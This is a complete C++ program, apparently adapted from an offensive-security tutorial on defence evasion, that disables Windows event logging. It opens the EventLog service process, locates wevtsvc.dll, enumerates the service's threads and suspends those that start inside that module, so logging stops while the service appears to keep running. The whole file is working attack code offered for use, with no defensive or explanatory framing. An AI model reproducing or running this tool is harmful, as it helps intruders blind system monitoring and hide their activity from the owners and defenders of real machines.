#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "DbgHelp")
#pragma comment(lib, "Advapi32.lib")

// https://www.ired.team/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads

int main()
{
	using myNtQueryInformationThread = NTSTATUS(NTAPI*)
	(
		IN HANDLE ThreadHandle,
		IN THREADINFOCLASS ThreadInformationClass,
		OUT PVOID ThreadInformation,
		IN ULONG ThreadInformationLength,
		OUT PULONG ReturnLength
		);

	HANDLE serviceProcessHandle;
	HANDLE snapshotHandle;
	HANDLE threadHandle;
	HMODULE modules[256] = {};
	SIZE_T moduleSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	WCHAR remoteModuleName[128] = {};
	HMODULE serviceModule = NULL;
	MODULEINFO serviceModuleInfo = {};
	DWORD_PTR threadStartAddress = 0;
	DWORD bytesNeeded = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	SERVICE_STATUS_PROCESS serviceStatusProcess = {};

	myNtQueryInformationThread NtQueryInformationThread = (myNtQueryInformationThread)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread"));

	SC_HANDLE sc = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);
	SC_HANDLE service = OpenServiceA(sc, "EventLog", MAXIMUM_ALLOWED);

	QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
	DWORD servicePID = serviceStatusProcess.dwProcessId;
	serviceProcessHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, servicePID);
	snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	EnumProcessModules(serviceProcessHandle, modules, moduleSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < modulesCount; i++)
	{
		serviceModule = modules[i];
		GetModuleBaseName(serviceProcessHandle, serviceModule, remoteModuleName, sizeof(remoteModuleName));
		if (wcscmp(remoteModuleName, L"wevtsvc.dll") == 0)
		{
			printf("Windows EventLog module %S at %p\n", remoteModuleName, serviceModule);
			GetModuleInformation(serviceProcessHandle, serviceModule, &serviceModuleInfo, sizeof(MODULEINFO));
		}
	}

	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == servicePID)
		{
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
			if (threadStartAddress >= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll && threadStartAddress <= (DWORD_PTR)serviceModuleInfo.lpBaseOfDll + serviceModuleInfo.SizeOfImage)
			{
				SuspendThread(threadHandle);
				printf("thread %d with start address %p has been suspended\n", threadEntry.th32ThreadID, threadStartAddress);
				Sleep(2000);
			}
		}
	}
	return 0;
}
